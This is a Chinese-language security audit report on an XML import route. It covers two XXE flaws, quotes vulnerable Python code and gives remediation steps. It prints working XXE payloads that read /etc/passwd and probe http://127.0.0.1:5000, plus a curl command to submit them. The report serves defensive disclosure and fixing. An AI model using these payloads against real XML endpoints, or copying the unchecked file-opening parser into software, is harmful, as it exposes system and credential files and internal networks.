# XML 数据导入功能安全审计报告

**审计模块：** `/xml-import` GET/POST 路由  
**漏洞数量：** 共发现 **2 项典型高危漏洞**

---

## 漏洞总览

| 编号 | 漏洞名称 | 触发位置 | 风险等级 |
|------|---------|---------|---------|
| VULN-XXE-01 | XML 外部实体注入（XXE）任意文件读取 | `app.py` resolve_xxe() 函数 | 高危 |
| VULN-XXE-02 | XXE 联合 SSRF 内网探测 | `app.py` resolve_xxe() SYSTEM URI | 中危 |

---

## 漏洞详情

### VULN-XXE-01：XXE 任意文件读取

**风险等级：** ⛔ **高危** — CVSS 3.1 Score: 8.6

**漏洞成因：** 代码检测到 `<!ENTITY ... SYSTEM "..."` 定义后，提取文件路径并直接使用 `open()` 读取本地文件，将文件内容替换到 XML 实体引用中。未对文件路径做任何白名单校验或限制，攻击者通过构造 SYSTEM 实体可读取服务器任意文件。

**漏洞代码（app.py resolve_xxe() 函数）：**
```python
for match in re.finditer(r'<!ENTITY\s+(\w+)\s+SYSTEM\s+"([^"]+)"', content):
    file_uri = match.group(2)
    file_path = file_uri.replace("file://", "")
    with open(file_path, "r", encoding="utf-8", errors="replace") as f:
        file_content = f.read()
```

**利用 Payload：**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "file:///etc/passwd">
]>
<root>
  <user name="xxe">
    <email>&xxe;</email>
  </user>
</root>
```

```bash
curl -X POST -d 'xml_data=...paylaod...' -b "session=..." \
  https://127.0.0.1:5000/xml-import
```

**危害说明：** 攻击者可读取服务器任意文件内容，包括系统配置文件（`/etc/passwd`、`/etc/shadow`）、应用源代码（`app.py`）、数据库文件（`users.db`）、SSL 私钥等。信息泄露后可进一步扩大攻击范围。

---

### VULN-XXE-02：XXE 联合 SSRF 内网探测

**风险等级：** ⚠️ **中危** — CVSS 3.1 Score: 6.5

**漏洞成因：** SYSTEM 标识符不仅支持 `file://` 协议，也支持 `http://` 等网络协议。攻击者可利用 XXE 发起服务端 HTTP 请求，探测内网服务。

**利用 Payload：**
```xml
<?xml version="1.0"?>
<!DOCTYPE foo [
  <!ENTITY xxe SYSTEM "http://127.0.0.1:5000">
]>
<root>
  <user name="ssrf">
    <email>&xxe;</email>
  </user>
</root>
```

**危害说明：** 攻击者可将服务器作为跳板探测内网服务、扫描端口，绕过防火墙对内部网络的访问控制。

---

## 修复措施对照

| 漏洞 | 修复方式 | 修复效果 |
|------|---------|---------|
| VULN-XXE-01 任意文件读取 | 禁用 XXE 实体解析，使用 `defusedxml` 或禁止 DOCTYPE | `file:///etc/passwd` → 返回解析错误 |
| VULN-XXE-02 内网 SSRF | 同 XXE-01 修复，禁用外部实体解析同时阻断网络请求 | 所有外部实体请求均被阻断 |
